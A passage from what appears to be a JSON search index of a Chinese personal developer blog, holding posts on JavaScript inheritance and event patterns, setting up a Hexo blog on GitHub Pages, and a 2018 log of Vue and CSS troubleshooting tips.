class=\"language-javascript\">//组合继承\nfuncion super(name){\n    this.name=name;\n    this.color=[&quot;red&quot;,&quot;blue&quot;];\n\n}\nSuper.prototype.sayname=function(){\n    alert(this.name);\n}\nfunction Sub(age){\n    Super.call(this);\n    this.age=age;\n}\nSub.prototype=new Super();//\nSub.prototype.constructor=Sub;//这个很重要！！\nSub.prototype.sayage=function(){\n    alert(this.age);\n}\n</code></pre>\n<h2 id=\"观察者模式\">观察者模式</h2>\n<pre><code class=\"language-javascript\">//观察者模式\nfunction EventTarget(){     \n    this.handlers = {}; \n} \nEventTarget.prototype = {     \n    constructor: EventTarget,\n    addHandler: function(type, handler){\n         if (typeof this.handlers[type] == &quot;undefined&quot;){\n              this.handlers[type] = [];\n         }\n         this.handlers[type].push(handler);\n     }, \n    fire: function(event){//执行\n         if (!event.target){\n             event.target = this;\n         }\n         if (this.handlers[event.type] instanceof Array){\n             var handlers = this.handlers[event.type];\n             for (var i=0, len=handlers.length; i &lt; len; i++){\n                 handlers[i](event); \n            }\n         }\n     },\n     removeHandler: function(type, handler){ \n        if (this.handlers[type] instanceof Array){ \n            var handlers = this.handlers[type]; \n            for (var i=0, len=handlers.length; i &lt; len; i++){ \n                if (handlers[i] === handler){ \n                    break;\n                 }\n             }\n             handlers.splice(i, 1); \n          }\n      }\n};</code></pre>\n<h2 id=\"分享一个题目\">分享一个题目</h2>\n<pre><code class=\"language-javascript\">\n//[附加题] 请实现下面的自定义事件 Event 对象的接口，功能见注释(测试1)\n//该 Event 对象的接口需要能被其他对象拓展复用(测试2)\n//测试1\nEvent.on(&#39;test&#39;, function (result) {\n    console.log(result);\n});\nEvent.on(&#39;test&#39;, function () {\n    console.log(&#39;test&#39;);\n});\nEvent.emit(&#39;test&#39;, &#39;hello world&#39;); // 输出 &#39;hello world&#39; 和 &#39;test&#39;\n// 测试2\nvar person1 = {};\nvar person2 = {};\nObject.assign(person1, Event);\nObject.assign(person2, Event);\nperson1.on(&#39;call1&#39;, function () {\n    console.log(&#39;person1&#39;);\n});\nperson2.on(&#39;call2&#39;, function () {\n    console.log(&#39;person2&#39;);\n});\nperson1.emit(&#39;call1&#39;); //输出 &#39;person1&#39;\nperson1.emit(&#39;call2&#39;); // 没有输出\nperson2.emit(&#39;call1&#39;); // 没有输出\nperson2.emit(&#39;call2&#39;); // 输出 &#39;person2&#39;\nvar Event = {\n    // 通过on接口监听事件eventName\n    // 如果事件eventName被触发，则执行callback回调函数\n    on: function (eventName, callback) {\n        //你的代码\n        if(!this.handles){\n            //Object.assign(target, source);\n//这个是ES6的新对象方法，用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。\n            Object.defineProperty(this, &quot;handles&quot;, {\n                value: {},\n                enumerable: false,//关键！\n                configurable: true,\n                writable: true\n            })\n        }\n\n       if(!this.handles[eventName]){\n            this.handles[eventName]=[];\n       }\n       this.handles[eventName].push(callback);\n    },\n    // 触发事件 eventName\n    emit: function (eventName) {\n        //你的代码\n       if(this.handles[arguments[0]]){\n           for(var i=0;i&lt;this.handles[arguments[0]].length;i++){\n               this.handles[arguments[0]][i](arguments[1]);\n           }\n       }\n    }\n};\n//输出所有页面宽度和高度大于50像素的节点。\nfunction traverse(oNode) {\n    var aResult = [];\n    oNode = oNode || document.body;\n    if (oNode.style) {\n        var nWidth = window.parseInt(oNode.style.width, 10) || 0;\n        var nHeight = window.parseInt(oNode.style.height, 10) || 0;\n        if (nWidth &gt; 50 &amp;&amp; nHeight &gt; 50) {\n            aResult.push(oNode);\n        }\n    }\n    var aChildNodes = oNode.childNodes;\n    if (aChildNodes.length &gt; 0) {\n        for (var i = 0, l = aChildNodes.length; i &lt; l; i++) {\n            var oTmp = aChildNodes[i];\n            aResult = aResult.concat(traverse(oTmp));\n        }\n    }\n    return aResult;\n}\n</code></pre>\n<h3 id=\"ie的userdata\">IE的userData</h3>\n<pre><code class=\"language-javascript\"> function set_ud(key,value) {\n    var a = document.getElementById(&#39;x&#39;); // x 为任意div 的id 值\n    a.addBehavior(&quot;#default#userdata&quot;);\n    a.setAttribute(key,value);\n    a.save(&quot;db&quot;);\n}\nfunction get_ud(key) {\n    var a = document.getElementById(&#39;x&#39;);\n    a.addBehavior(&quot;#default#userdata&quot;);\n    a.load(&quot;db&quot;);\n    alert(a.getAttribute(key));\n}\nfunction del_ud(key) {\n    var a = document.getElementById(&#39;x&#39;);\n    a.addBehavior(&quot;#default#userdata&quot;);\n    a.setAttribute(key, &quot;&quot;); // 设置为空值即可\n    a.save(&quot;db&quot;);\n}\nwindow.onload = function(){\n    set_ud(&#39;a&#39;,&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;); // 设置\n    get_ud(&#39;a&#39;); // 获取a 的值\n    del_ud(&#39;a&#39;); // 删除a 的值\n    get_ud(&#39;a&#39;); // 获取a 的值\n};</code></pre>\n","index":11},{"filePath":"post\\2018\\2\\26-rebuild-blog.md","htmlPath":"/post/2018/2/26-rebuild-blog.html","name":"26-rebuild-blog.md","type":"md","title":"基于hexo搭建博客过程","date":"2018/2/26","categories":"Experience","tags":"专题探究","html":"<p>我是一个很喜欢做笔记的人，老是写在word文档不方便。之前用jekyll搭了一个，感觉写得也是乱七八糟，页面也不好看，改的话不如重新重写一个好了</p>\n<p>有了上次经验，觉得做一个东西真的要认真规划一下，不然做出来的东西老是迁就的感觉，能用就行。这样是不行的。像做一个产品来做它</p>\n<p>源码地址  <a href=\"https://github.com/LRY1994/hexo-blog.git\">https://github.com/LRY1994/hexo-blog.git</a></p>\n<h2 id=\"问题定义\">问题定义</h2>\n<p>重构博客原因有下：</p>\n<ol>\n<li>Jkeyll目录文件关系得按照规定放置，灵活性差（虽然hexo也是这样）</li>\n<li>日记页面不美观，想换，干脆重新规划做一个</li>\n<li>学习一下怎么在github上弄1.0版本，2.0版本</li>\n<li>jekyll显示markdown不好看</li>\n</ol>\n<p>参考<a href=\"https://www.jianshu.com/p/c4f145fdd637\">博客搭建可行性方案( jekyll , hexo , Wordpress )</a></p>\n<p>较多人采用的博客搭建方案有如下几种：</p>\n<ol>\n<li>Git+Github+Markdown+jekyll （免费）</li>\n<li>Git+Github+Markdown+hexo （免费）</li>\n<li>虚拟主机＋插件＋Wordpress （付费）</li>\n</ol>\n<p>为了省钱，所以选择第二种</p>\n<h2 id=\"可行性研究\">可行性研究</h2>\n<p>毋庸置疑，可行</p>\n<h2 id=\"需求分析\">需求分析</h2>\n<p>分为工作、学习、生活三个模块</p>\n<ul>\n<li>工作<ul>\n<li>简历 (制作简历网页，jekyll那个是直接把简历模板copy过来的)</li>\n</ul>\n</li>\n<li>学习<ul>\n<li>笔记 （可按时间、类别分类）<ul>\n<li>读书笔记（以书籍为单位来）</li>\n<li>随笔笔记（在生活中遇到的问题或者想要摘录的，以月为单位）</li>\n<li>专题笔记（围绕某个东西的笔记，以主题为单位）</li>\n</ul>\n</li>\n<li>项目<ul>\n<li>项目一</li>\n<li>项目二 等</li>\n</ul>\n</li>\n<li>用户体验（把有时候产品用得不愉快的经历记录下来，一篇，不定时更新）</li>\n</ul>\n</li>\n<li>生活<ul>\n<li>减肥 <ul>\n<li>运动日历 （因为办了健身卡 ）</li>\n<li>减脂餐图栏</li>\n</ul>\n</li>\n<li>护肤化妆心得 （我一直都有颗当美妆博主的心）</li>\n<li>旅游攻略 （喜欢旅游，但不可以经常旅游，所以很珍惜每一次，都想把它记录下来）</li>\n</ul>\n</li>\n<li>其他<ul>\n<li>社区账号（比较常用segmentfault/weibo/V2EX）</li>\n<li>聊天框</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"概要设计\">概要设计</h2>\n<p>输出原型图\n使用mockplus</p>\n<h2 id=\"详细设计\">详细设计</h2>\n<h2 id=\"编码和单元测试\">编码和单元测试</h2>\n<h2 id=\"集成测试\">集成测试</h2>\n<p>最终部署在github</p>\n<ol>\n<li><p>Permission denied (publickey)错误\n 解决方法\n <a href=\"https://www.cnblogs.com/xsilence/p/6001938.html\">针对github权限导致hexo部署失败的解决方案</a></p>\n</li>\n<li><p>和jekyll不同，<code>hexo d</code>会覆盖掉github仓库的代码，试了创建两个分支，比较麻烦，放弃。建立两个仓库，一个放源代码，一个放生成代    码。注意，生成代码需要放在master分支上，跟jekyll一样，生成代码的项目名字要取名为<code>username.github.io</code></p>\n</li>\n<li><p>使用next主题的时候需要在_config.yml把<code>permalink: :title</code>中改成\n <code>permalink: :title.html</code>\n 不然点击文章的时候会出现下载框</p>\n</li>\n<li><p>about页面需要自己创建，并且自己写。</p>\n<p> 大容器页面布局默认_layout布局，在<code>theme/next/layout_layout.swig</code>中定义。</p>\n<p> 全部页面都是默认page布局，在<code>theme/next/layout/page.swig</code>中定义。</p>\n<p> 只有archive,tag,category页面不用创建，直接在<code>theme/next/layout/</code>对应名字文件里面写，即</p>\n<p> <code>theme/next/layout/archive.swig</code></p>\n<p> <code>theme/next/layout/category.swig</code></p>\n<p> <code>theme/next/layout/tag.swig</code></p>\n<p> 但是tag,category页面还需要多做一步：</p>\n<pre><code> $ cd your-hexo-site\n $ hexo new page tags</code></pre><p> 编辑刚新建的页面，将页面的类型设置为 tags ，主题将自动为这个页面显示标签云。页面内容如下：</p>\n<pre><code> title: 标签\n date: 2014-12-22 12:39:04\n type: &quot;tags&quot;</code></pre><p> 在菜单中添加链接。编辑 主题配置文件 ， 添加 tags 到 menu 中，如下:</p>\n<pre><code> menu:\n home: /\n archives: /archives\n tags: /tags</code></pre></li>\n<li><p>换了主题重新部署，需要重新打包</p>\n<pre><code> hexo clean\n hexo g\n hexo d</code></pre><p> 这个需要一段时间githubPage才会更新</p>\n</li>\n<li><p>写文章的时候要插入图片 </p>\n<p> (1) 按照<a href=\"https://hexo.io/zh-cn/docs/asset-folders.html\">官方说法</a></p>\n<pre><code>     _posts\n\n         |- post1.md\n\n         |_ post1\n\n             |- pic1.png</code></pre><ol>\n<li><p>首先确认_config.yml中有：\n```post_asset_folder: true``</p>\n</li>\n<li><p>安装</p>\n<p><code>npm install https://github.com/CodeFalling/hexo-asset-image --save</code></p>\n<p>{% asset_img 图片文件名 [title] %}这样可以插入文章资源目录下的图片</p>\n<p>(2) 还是写正常的markdown,<code>![](./img.png)</code>,<code>hexo g</code>生成public文件夹之后，把图片复制到改目录下，再<code>hexo d</code></p>\n<p>(3) 看到还有一个解决方法，没试过\n<a href=\"http://etrd.org/2017/01/23/hexo%E4%B8%AD%E5%AE%8C%E7%BE%8E%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/\">http://etrd.org/2017/01/23/hexo%E4%B8%AD%E5%AE%8C%E7%BE%8E%E6%8F%92%E5%85%A5%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/</a></p>\n</li>\n</ol>\n</li>\n<li><p>添加文章阅读量\n<a href=\"http://www.jeyzhang.com/hexo-next-add-post-views.html\">添加文章阅读量</a></p>\n</li>\n</ol>\n<h2 id=\"软件维护\">软件维护</h2>\n<p>管理博客</p>\n<h2 id=\"总结\">总结</h2>\n<pre><code>最后发现hexo并不能实现博客以外的东西，可能它的定位就是博客框架吧。\n而且hexo和next都不可以自定义layout,Jekyll还可以自定义layout放置在_layout目录下</code></pre>","index":12},{"filePath":"post\\2018\\2018.md","htmlPath":"/post/2018/2018.html","name":"2018.md","type":"md","title":"2018遇到的问题","date":"2018/2/1","categories":"Experience","tags":"日常记录","html":"<h2 id=\"20182\">2018/2</h2>\n<h3 id=\"火狐和ie下-javascriptvoid0-会弹出空白页\">火狐和IE下 javascript:void(0) 会弹出空白页</h3>\n<p>本来javascript:void(0);的用处是不用整体刷新网页且返回一个空值，但这儿由于DOM本身的冒泡事件所以会最后执行HREF属性内的javascript:void(0);导致执行函数返回了一个空值，所以覆盖掉了前面正常执行函数所返回的值引起的错误。</p>\n<p>一般情况下，IE会先运行DOM本身绑定的事件，如ONCLICK;如果没有阻止冒泡，则会顺序执行HREF属性。如果想正确运行，可以在前面用RETURN FALSE终止冒泡，例如：</p>\n<pre><code>&lt;a target=&quot;_blank&quot; class=&quot;prev&quot; onclick=&quot;return false;&quot;   href=&quot;javascript:void(0);&quot;&gt;&lt;/a&gt;</code></pre><p>或者直接删去也行，如：</p>\n<pre><code>&lt;a target=&quot;_blank&quot;  class=&quot;prev&quot; &gt;&lt;/a&gt;</code></pre><p>但是后者hover的时候没有手势的pointer</p>\n<h3 id=\"vue2父组件传递props异步数据到子组件，获取到的是undefined\">vue2父组件传递props异步数据到子组件，获取到的是undefined.</h3>\n<p>解决方法<a href=\"http://www.jb51.net/article/117447.htm\">参考链接</a></p>\n<ol>\n<li>最简单的解决方法：使用v-if</li>\n<li>子组件使用watch来监听父组件改变的prop，使用methods来代替created</li>\n<li>子组件watch computed data 相结合，有点麻烦</li>\n<li>使用emit，on，bus相结合（使用了bus库）</li>\n<li>vuex结合computed、mapState或者合computed、mapGetters</li>\n</ol>\n<h3 id=\"对象的属性名称可以是变量吗？\">对象的属性名称可以是变量吗？</h3>\n<p>可以，运用方括号法设置就是。如</p>\n<pre><code>var a = &quot;name&quot;;\nvar b = 10;\nvar obj = {};\nobj[a] = b;</code></pre><h3 id=\"后台给的服务链接直接插入html中img的src里\">后台给的服务链接直接插入html中img的src里</h3>\n<p>修改图片之后，因为src的内容一直都是后台服务链接，是个不变的值，所以不会重新去请求，图    片会一直不变。如果刷新页面这个链接返回的图片会改变，为了做到点击图片只重载这个src而整个页面不刷新，采用的方法是在后面加上          Math.random()，例如 </p>\n<pre><code>`http:${this.baseURL}gw/app.get.logo?tenantId=${this.tenantId}&amp;appId=${this.appId}?`+Math.random();</code></pre><h3 id=\"扩展运算符可以用于数组深拷贝\">扩展运算符可以用于数组深拷贝</h3>\n<pre><code>var arr2 = arr;\nvar arr3 = [...arr];\nconsole.log(arr===arr2); //true, 说明arr和arr2指向同一个数组\nconsole.log(arr===arr3); //false, 说明arr3和arr指向不同数组</code></pre><h3 id=\"number-的修饰符\">.number 的修饰符</h3>\n<p>数字类型的验证需要在 v-model 处加上 .number 的修饰符，这是 Vue 自身提供的用于将绑定值转化为 number 类型的修饰符。              v-model.number只会截取数字部分，比如100ttt只会取前面的100。做修改操作的时候这种情况用自定义validator解决</p>\n<h2 id=\"20183\">2018/3</h2>\n<h3 id=\"给点击路由的时候加上监听事件\">给点击路由的时候加上监听事件</h3>\n<pre><code class=\"language-html\">&lt;router-link class=&quot;my-link&quot; :to=&quot;{name: &#39;main.provider.index&#39;, params: {providerId: scope.row.providerId}}&quot;&gt;提供者主页&lt;/router-link&gt;</code></pre>\n<p>解决方法：给组件绑定原生事件。有时候，你可能想在某个组件的根元素上监听一个原生事件。可以使用 v-on 的修饰符 .native。例如：</p>\n<pre><code>&lt;my-component v-on:click.native=&quot;doTheThing&quot;&gt;&lt;/my-component&gt;</code></pre><p>参考连接\n<a href=\"https://segmentfault.com/q/1010000007896386\">给组件绑定原生事件</a></p>\n<h3 id=\"块内元素文字上下居中\">块内元素文字上下居中</h3>\n<p>line-height设置为height的值</p>\n<h3 id=\"用refs来组件通信\">用refs来组件通信</h3>\n<p>在讨论非父子通信的时候，并在没有用Vuex的情况下，我是用官网那种创建Vue实例的方法，但是同事提到了另一种方法\n用refs来引用，不禁一想这好像也是一种解决方案，就是觉得怪怪的。在这里记录一下</p>\n<h3 id=\"关于第4点，今天工作用了thisrefs来传播事件，类似于brocast但是vue2把brocast废除了。\">关于第4点，今天工作用了this.$refs来传播事件，类似于$brocast,但是VUE2把$brocast废除了。</h3>\n<p>总结一下vue传播事件</p>\n<p>(1) 子组件传播事件给父组件，用<code>$on,$emit</code>.</p>\n<p>虽然说是这样说，但是不是直接在父组件里面写$on的,应该是这样</p>\n<pre><code class=\"language-html\">&lt;parent&gt;\n    &lt;child @eventname=&quot;event&quot;&gt;\n&lt;/parent&gt;</code></pre>\n<p>然后在parent组件里面写 event函数.event(){}</p>\n<p>子组件调用的时候用<code>this.$emit(&#39;eventname&#39;,payload)</code></p>\n<p>(2)父组件传播事件给子组件，用 <code>$refs</code></p>\n<pre><code class=\"language-html\">&lt;parent&gt;\n    &lt;child ref=&quot;refname&quot;&gt;\n&lt;/parant&gt;</code></pre>\n<p>调用的时候用<code>this.$ref[&#39;refname&#39;].eventname()</code></p>\n<p>(3)上面有种都麻烦的话，创建实例bus</p>\n<h3 id=\"js的数组可以是这样的形式\">js的数组可以是这样的形式</h3>\n<p><code>(4) [{…}, {…}, {…}, {…}, total: 4, code: &quot;core.ok&quot;]</code></p>\n<p>他的length是4</p>\n<h3 id=\"把字符串转换成数字可以用数字运算符但是--不行\">把字符串转换成数字可以用数字运算符,但是 + 不行</h3>\n<pre><code class=\"language-javascript\">console.log(&quot;2&quot;&gt;&gt;&gt;0)  //2 number \nconsole.log(&quot;2&quot;&gt;&gt;0)  //2 number \nconsole.log(&quot;2&quot;&lt;&lt;0)  //2 number  没有（&lt;&lt;&lt;）\nconsole.log(&quot;2&quot;- 0)    //2 number\nconsole.log(&quot;2&quot;+0)    //20 string</code></pre>\n<h3 id=\"reduce函数好好用\">reduce函数好好用</h3>\n<p>今天写了一个有重大作用的reduce函数，好开心。在此纪念一下</p>\n<pre><code class=\"language-javascript\">//str {String}, &quot;app.get.logo.list&quot;\n//ctx {Object},  this._$http\n//return {Object}, this._$http.app.get.logo.list\n getBackend(str){\n        const arr = this.loadBackend.split(&#39;.&#39;);\n        let ctx= this._$http;\n        let a;\n        let b=arr.reduce((prev, cur, idx) =&gt; {                \n              a = prev[cur] ;         \n            return a;\n        },ctx);              \n          return b;      \n      }</code></pre>\n<h3 id=\"vue项目中全局引入scss文件的方法\">vue项目中全局引入scss文件的方法</h3>\n<pre><code class=\"language-shell\">npm install node-sass --save-dev\nnpm install sass-loader --save-dev\nnpm install sass-resources-loader --save-dev</code></pre>\n<p>修改build/utils.js</p>\n<pre><code class=\"language-javascript\">scss: generateLoaders(&#39;sass&#39;).concat(\n      {\n        loader: &#39;sass-resources-loader&#39;,\n        options: {\n          resources: path.resolve(__dirname, &#39;../src/assets/your.scss&#39;)\n        }\n      }\n    )</code></pre>\n<h3 id=\"elementui的layout问题\">elementUI的layout问题</h3>\n<p>el-footer会直接fixed在窗口底部，不好看，</p>\n<p>解决方法：el-footer放到el-main里面</p>\n<pre><code class=\"language-html\">&lt;el-container style=&quot;height:100%;&quot;&gt;\n    &lt;el-header class=&quot;header&quot; style=&quot;height:100px&quot;&gt;\n        &lt;cty-navbar :navs=&quot;navs&quot;&gt;&lt;/cty-navbar&gt;\n    &lt;/el-header&gt;\n\n    &lt;el-main&gt;      \n        &lt;el-scrollbar wrap-style=&quot;overflow-x:hidden;&quot; style=&quot;min-height: 800px&quot;&gt;\n            &lt;div&gt;\n                &lt;router-view&gt;&lt;/router-view&gt;\n            &lt;/div&gt;           \n        &lt;/el-scrollbar&gt;\n\n        &lt;el-footer class=&quot;footer&quot; style=&quot;height:70px&quot;&gt;\n            &lt;cty-footer&gt;&lt;/cty-footer&gt;\n        &lt;/el-footer&gt;\n    &lt;/el-main&gt;\n\n&lt;/el-container&gt;</code></pre>\n<h3 id=\"vue路由刷新问题，两个路由对应一个组件，如何能让路由重载\">vue路由刷新问题，两个路由对应一个组件，如何能让路由重载</h3>\n<p><a href=\"https://segmentfault.com/q/1010000010844655\">https://segmentfault.com/q/1010000010844655</a></p>\n<p>写在共用组件文件里</p>\n<pre><code class=\"language-javascript\">data(){\n...\n}\nmounted(){...},\n watch: {          \n            $route: {\n                handler: function (val, oldVal) {\n                    this.worksheet_type = this.$route.params.type;                     \n                },\n                deep: true\n            }\n        },</code></pre>\n<p>在共用组件上加上key\n<code>&lt;div :key=&quot;$route.path&quot;&gt;</code></p>\n<h3 id=\"单行文本超出隐藏并显示省略号\">单行文本超出隐藏并显示省略号</h3>\n<pre><code class=\"language-css\">.element{\nwidth: 20em;/*不允许出现半汉字截断*/\noverflow: hidden; /*自动隐藏文字*/\ntext-overflow: ellipsis;/*文字隐藏后添加省略号*/\nwhite-space: nowrap;/*强制不换行*/</code></pre>\n<h3 id=\"多行文字隐藏加省略号\">多行文字隐藏加省略号</h3>\n<pre><code class=\"language-css\">.element{\n    width: 20em;\n    height: 3em;/*注意高度和宽度，不允许出现半汉字截断*/\n    line-height: 1.5em;\n    overflow: hidden;\n    display: -webkit-box;\n    -webkit-line-clamp: 3;\n    -webkit-box-orient: vertical;\n}</code></pre>\n<h2 id=\"20184\">2018/4</h2>\n<h3 id=\"实现qq弹窗-和qq号为qqnum聊天\">实现QQ弹窗 和QQ号为qqnum聊天</h3>\n<pre><code class=\"language-html\">&lt;a target=&quot;_blank&quot; :href=&quot;`http://wpa.qq.com/msgrd?v=3&amp;uin=${qqnum}&amp;site=qq&amp;menu=yes`&quot;&gt;\n    &lt;img border=&quot;0&quot; :src=&quot;`http://wpa.qq.com/pa?p=2:1424314130:51`&quot; alt=&quot;点击这里给我发消息&quot; title=&quot;点击这里给我发消息&quot;/&gt;\n&lt;/a&gt;</code></pre>\n<h3 id=\"vue全局过滤器也可以当函数使用\">Vue全局过滤器也可以当函数使用</h3>\n<pre><code class=\"language-javascript\">this.$options.filters.dateformat</code></pre>\n<h3 id=\"字符串转义问题\">字符串转义问题</h3>\n<p>本地字符串不会自己转义，所以本地需要写成 <code>\\\\d</code></p>\n<p>后台请求返回的字符串会自动帮你转义，所以在后台数据库只需要写成<code>\\d</code></p>\n<h3 id=\"如何解决vue父组件模板slot到孙子组件中去\">如何解决vue父组件模板slot到孙子组件中去</h3>\n<pre><code>&gt;每一个被继承的组件都需要有slot;</code></pre><p><a href=\"https://segmentfault.com/q/1010000012141592\">参考链接</a></p>\n<h3 id=\"记录一下第一次使用async-await-解决了困扰我一早上的异步问题赞！！！\">记录一下第一次使用async ,await ,解决了困扰我一早上的异步问题,赞！！！</h3>\n<pre><code class=\"language-javascript\">   //获取文件信息\n    getFileInfo(item){\n        let fileId= item.value;\n        const downloadLink =`/gw/tenant/worksheet/extend/Download?worksheetInfoId=${item.worksheetInfoId}&amp;blobId=offer.info`;\n        return new Promise((resolve,reject)=&gt;{\n            if(fileId == &#39;undefined&#39;) resolve(null);\n            this._$http.tenant.offerExtendGetFileInfo({fileId: fileId})\n            .then(res=&gt;{ \n                res={...res,downloadLink};\n                resolve(res)\n            }) \n        })           \n    },\n    //获取文件信息\n    fileGetter: async function(item) {           \n        const fileInfo = await this.getFileInfo(item);\n        return Promise.resolve(fileInfo);         \n    },</code></pre>\n<h3 id=\"自定义指令---解决跟dom有关的问题\">自定义指令---解决跟dom有关的问题</h3>\n<p>最大的用处就是可以引用一些第三方的代码插入到Vue项目中，比如有一个操作dom的函数：</p>\n<pre><code class=\"language-javascript\">//当然，真实情况第三方的代码要复杂的多\nfunction changeColor(dom){\n    dom.style.backgroundColor = &quot;red&quot;;\n}</code></pre>\n<p>我们可以注册一个全局的指令来为需要执行changeColor方法的dom提供指令：</p>\n<pre><code class=\"language-javascript\">Vue.directives(&#39;color&#39;,{\n    bind:function(el){\n        changeColor(el)\n    }\n})</code></pre>\n<p>这样，如果需要这个dom改变颜色的话，只需要这样即可：\n<code>&lt;div v-color&gt;改变颜色&lt;/div&gt;</code></p>\n<p>当日常开发遇到跟dom有关的问题却一筹莫展时，可以想想自定义指令是否有功能可以解决为题</p>\n<h3 id=\"父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritattrs】和【attrs】\">父组件给子组件传值，这个值还要从子组件传给它的子组件【inheritAttrs】和【attrs】</h3>\n<p>直接一层一层传prop非常麻烦.\nVue提供了【inheritAttrs】和【attrs】两个功能来解决这样的问题</p>\n<pre><code>//父组件\n&lt;template&gt;\n   &lt;div&gt;\n     &lt;child :text=&quot;text&quot;  :count=&quot;count&quot;&gt;&lt;/child&gt;\n   &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n    export default{\n        data(){\n            return {\n                text:&quot;父组件的值&quot;，\n                count:123456，\n            }\n        }\n    }\n&lt;/script&gt;</code></pre><pre><code>//子组件\n&lt;template&gt;\n    &lt;div&gt;{{text}}&lt;/div&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    export default{\n        props:[&quot;text&quot;]\n    }\n&lt;/script&gt;</code></pre><p>这里父组件的count属性仅仅挂在子组件上，并没有使用。此时我们打开浏览器，可以看到子组件的dom上显示的展示了<code>&lt;div class=&#39;child&#39; count=&quot;123456&quot;&gt;&lt;/div&gt;</code>。</p>\n<p>此时，我们可以通过设置inheritAttrs: false来取消这种默认行为：</p>\n<pre><code class=\"language-javascript\">data(){\n  return{\n    ......   \n  }  \n}\n\ninheritAttrs: false,\nmounted(){\n　　console.log(this.$attrs); //{count:123456}\n}</code></pre>\n<p>这时再看dom上就没有count属性了。然后，我还打印了this.$attrs的值，值为一个包含着count键值对的Object。\n也就是说，<code>父组件没有props的属性值会被保存在一个名为$attrs中供子组件使用</code>，然而这并没有解决开头子组件的子组件获取值的问题。\n别急，我们只需要在子组件上加个东西就可以了：</p>\n<pre><code>&lt;template&gt;\n    &lt;div class=&quot;child&quot;&gt;\n        &lt;my-child v-bind=&quot;$attrs&quot;&gt;&lt;/my-child&gt;\n    &lt;/div&gt;\n&lt;/template&gt;</code></pre><p>这样，子组件的子组件也可以获取这个值了。</p>\n<h3 id=\"provide--inject--更适合用来做父组件给后代组件传值，\">provide / inject -更适合用来做父组件给后代组件传值，</h3>\n<p>provide/inject方法要比inheritAttrs/attrs更适合用来做父组件给子组件或孙组件传值，\n<a href=\"https://cn.vuejs.org/v2/api/#provide-inject\">文档的链接</a></p>\n<pre><code>//父组件使用provide\n&lt;template&gt;  \n    &lt;div class=&quot;parent&quot;&gt;     \n         &lt;child-component&gt;&lt;/child-component&gt;   \n    &lt;/div&gt;  \n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {  \n    ......  \n    provide: { parent: &quot;父组件的值&quot;},  \n    components:{    child-component,  }, \n     ......\n&lt;/script&gt;\n\n\n//此时可以在子组件通过这种方式获取父组件中“parent”的值：\n//子组件中\nexport default {  \n    mounted(){      \n        console.log(this.parent); //&quot;父组件的值&quot;  \n    },  \n    inject: [&#39;parent&#39;],\n}</code></pre><p>2018/5</p>\n<h3 id=\"发现三个很厉害的库\">发现三个很厉害的库</h3>\n<p><code>htmlDocx</code> (将html代码导出为doc文件)<a href=\"http://evidenceprime.github.io/html-docx-js/build/html-docx.js\">http://evidenceprime.github.io/html-docx-js/build/html-docx.js</a> \n<code>saveAs</code>(将浏览器内存中的doc文件保存至硬盘)<a href=\"http://evidenceprime.github.io/html-docx-js/test/vendor/FileSaver.js\">http://evidenceprime.github.io/html-docx-js/test/vendor/FileSaver.js</a>\n<code>domtoimage</code>(将dom节点转化成为图片)<a href=\"https://cdnjs.cloudflare.com/ajax/libs/dom-to-image/2.6.0/dom-to-image.min.js\">https://cdnjs.cloudflare.com/ajax/libs/dom-to-image/2.6.0/dom-to-image.min.js</a></p>\n<p>domtoimage.toPng(dom); //转出来是base64\nsaveAs(htmlDocx.asBlob(html), filename); </p>\n<p>主要这三个库方法\ndomtoimage.toPng\nsaveAs\nhtmlDocx.asBlob  </p>\n<h3 id=\"vue的router的push传递参数有没有不把参数展示在url中的传递方式？\">Vue的router的push传递参数有没有不把参数展示在url中的传递方式？</h3>\n<pre><code class=\"language-javascipt\">const userId = 123\nrouter.push({ name: &#39;user&#39;, params: { userId }})\n// 路由设置 path 为：&#39;/user/:userId&#39;\n// 跳转路径：&#39;/user/123&#39;\n\n// 路由设置 path 为：&#39;/user&#39;\n// 跳转路径：&#39;/user&#39;\n// this.$route.params.userId 获取userId</code></pre>\n<h2 id=\"20186\">2018/6</h2>\n<h3 id=\"使用keep-alive\">使用keep-alive</h3>\n<p>在商品列表进入商品详情页之后\n<a href=\"https://www.cnblogs.com/nokelong/p/8124513.html\">vue中使用keepAlive组件缓存遇到的坑</a></p>\n<h3 id=\"a标签里面不加download属性会下载下来一些莫名其妙的东西\">a标签里面不加download属性会下载下来一些莫名其妙的东西</h3>\n<pre><code class=\"language-html\">&lt;a :href=&quot;file.worksheetFileId|url&quot;  :download=&quot;file.fileName&quot;&gt;{{file.fileName}}&lt;/a&gt;</code></pre>\n<p>html5对a标签新增的download属性用于下载文件，简单的理解是a标签如果添加了download属性，那么点击它的时候就不会跳转，而是会触发浏览器下载文件。\n那么我不加download属性会下载下来的东西是什么？？</p>\n<p>答案：docx后缀的word文档用解压软件打开就是这个目录结构</p>\n<h3 id=\"nexttick\">$nextTick</h3>\n<p>Vue 实现响应式并不是数据发生变化之后 DOM 立即变化，而是按一定的策略进行 DOM 的更新。\n$nextTick 是在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后使用 。</p>\n<h3 id=\"router-link存在的问题是，手动输入改变url，下面路由没监听到\">router-link存在的问题是，手动输入改变url，下面路由没监听到</h3>\n<p> vue-router在IE 11下有bug,a href 里的路径，点击地址栏发生了变化，页面并不跳转\nvm._route.path并没有发生变化，和地址栏不同步\n要加上这段代码修正下：</p>\n<pre><code class=\"language-javascript\">function fixRouterIE(vm){\n    //IE 11下\n    if (\n      &#39;-ms-scroll-limit&#39; in document.documentElement.style &amp;&amp; \n      &#39;-ms-ime-align&#39; in document.documentElement.style\n    ) { \n      window.addEventListener(&quot;hashchange&quot;, function(event) {\n        const currentPath = window.location.hash.slice(1);\n\n        if (vm._route.path !== currentPath) {\n          vm._router.push(currentPath)\n        }\n      }, false)\n    }\n}</code></pre>\n<h3 id=\"height设为100要求父容器高度确定，否则无效。\">height设为100%要求父容器高度确定，否则无效。</h3>\n<h3 id=\"el-scrollbar滚动到容器底部\">el-scrollbar滚动到容器底部</h3>\n<pre><code>&lt;el-scrollbar 